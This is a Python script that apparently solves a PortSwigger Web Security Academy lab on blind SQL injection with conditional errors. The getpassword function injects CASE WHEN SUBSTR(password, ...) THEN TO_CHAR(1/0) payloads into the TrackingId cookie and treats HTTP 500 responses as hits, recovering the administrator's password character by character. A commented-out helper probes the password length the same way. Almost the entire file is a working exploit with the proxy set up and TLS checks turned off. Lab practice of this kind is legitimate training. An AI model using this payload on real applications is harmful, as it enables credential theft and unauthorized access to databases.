import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress Warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Set Proxy's
PROXIES = {
          "http":"127.0.0.1:8080",
          "https":"127.0.0.1:8080",
     }
# Payload
PAYLOAD = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

# Set url
URL = "https://0a2900b5047175da802917b70064005b.web-security-academy.net/"

# Set cookies
COOKIES = dict(TrackingId="xR4VV3ippKVZJGlH", session="ijcISBUc7kqtQ6qYSYYwxbfJGxk8HBXM")

def sendrequest(url: str, proxies: dict, cookies: dict) -> requests.models.Response:
     myrequest = requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=(5,20))
     return myrequest 

# # Check number of pass characters
# def characternumber(geturl: requests.models.Response, cookie: dict) -> None:
#     trackingId = cookie['TrackingId']
#     for charnumber in range(1, 65):
#          cookie['TrackingId'] = trackingId + "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>" + str(charnumber) + ")='a"
#          #myrequest = requests.get(geturl.url, cookies=cookie, proxies=proxies, verify=False, timeout=(5,20))
#          myrequest = sendrequest(geturl.url, proxies, cookie)
#          print(f"{charnumber}: Status<{myrequest.status_code}> Content-Length<{myrequest.headers['Content-Length']}>")

def getpassword(url: str, proxy: dict, cookie: dict) -> list:
     collection = []
     for item in range(1, 25):
          for character in PAYLOAD:
               new_cookie = cookie.copy()
               # Blind SQL injection with conditional errors
               new_cookie["TrackingId"] = f"{new_cookie['TrackingId']}' AND (SELECT CASE WHEN (SUBSTR(password, {item}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')='a"
               myrequest = sendrequest(url, proxy, new_cookie)
               if (myrequest.status_code == 500):
                    collection.append(character)
     return collection
     
def main() -> None:
    try:
         password = "".join(getpassword(URL, PROXIES, COOKIES))
         print(password)

          
    except requests.exceptions.ConnectTimeout as contime:
          print(contime.args[0])
    except requests.exceptions.ProxyError as proxerr:
          print(proxerr.args[0])

if __name__ == "__main__":
     main()